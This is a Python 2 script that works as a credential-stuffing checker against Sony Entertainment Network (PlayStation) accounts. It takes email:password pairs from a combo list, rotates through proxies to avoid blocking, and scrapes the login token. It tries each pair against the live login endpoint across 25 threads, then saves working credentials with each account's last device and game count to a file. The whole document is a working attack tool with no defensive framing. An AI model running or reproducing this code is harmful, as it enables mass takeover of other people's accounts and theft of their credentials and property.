import requests
import re
import concurrent.futures
import codecs
from random import choice

requests.packages.urllib3.disable_warnings()

def check(email, passw, proxy):
    print 'Checking {0}!'.format(email)
    s = requests.session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36'
    }
    work = True
    while work:
        proxy = {
            #'http': '127.0.0.1:8888',
            #'https': '127.0.0.1:8888'
            'http': proxy,
            'https': proxy
        }
        r = s.get(
                    'https://account.sonyentertainmentnetwork.com/liquid/login.action',
                    verify=False,
                    proxies=proxy,
                    headers=headers
                )
        try:
            if 'Sign In' in r.text:
                work = False
                token = re.findall('struts.token" value="(.*?)"', r.text)
                data = 'struts.token.name=struts.token&struts.token={0}&j_username={1}&j_password={2}&service-entity=np'.format(token[0], email, passw)
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                headers['Referer'] = 'https://account.sonyentertainmentnetwork.com/liquid/login.action'
                r = s.post(
                            'https://account.sonyentertainmentnetwork.com/liquid/j_spring_security_check',
                            verify=False,
                            data=data,
                            proxies=proxy,
                            headers=headers
                           )
                if 'Incorrect e-mail address or password.' not in r.text and 'Account Management' in r.text:
                    print 'Account {0} works!'.format(email)
                    if 'you are confirming that you' in r.text:
                        r = s.get(
                                    'https://account.sonyentertainmentnetwork.com/liquid/eula.action',
                                    verify=False,
                                    proxies=proxy,
                                    headers=headers
                                  )
                    dev = re.findall('lastDeviceName">(.*?)<', r.text)
                    game = re.findall('homeMediaCount hovChange">(.*?)<', r.text)
                    f = open("Working.txt", "a")
                    f.write("Account: {0}:{1}\n".format(email, passw))
                    f.write("Last Device: {0}\n".format(dev[0]))
                    f.write("Games: {0}\n".format(game[0]))
                    f.write("\n\n")
                    f.close()
                else:
                    print 'Account {0} does not work!'.format(email)
            else:
                with codecs.open('proxies.txt', 'r') as f:
                    proxies = f.readlines()
                    proxy = choice(proxies)
        except Exception:
            with codecs.open('proxies.txt', 'r') as f:
                proxies = f.readlines()
                proxy = choice(proxies)
    
def main():
    with codecs.open('accounts.txt', 'r') as f:
        userpass = f.readlines()
    with codecs.open('proxies.txt', 'r') as f:
        proxies = f.readlines()
    for userpasscombo in userpass:
        with concurrent.futures.ThreadPoolExecutor(max_workers=25) as x:
            for userpasscombo in userpass:
                upass = userpasscombo.split(':')
                x.submit(check, upass[0].strip(), upass[1].strip(), choice(proxies))
            
if __name__ == '__main__':
    main()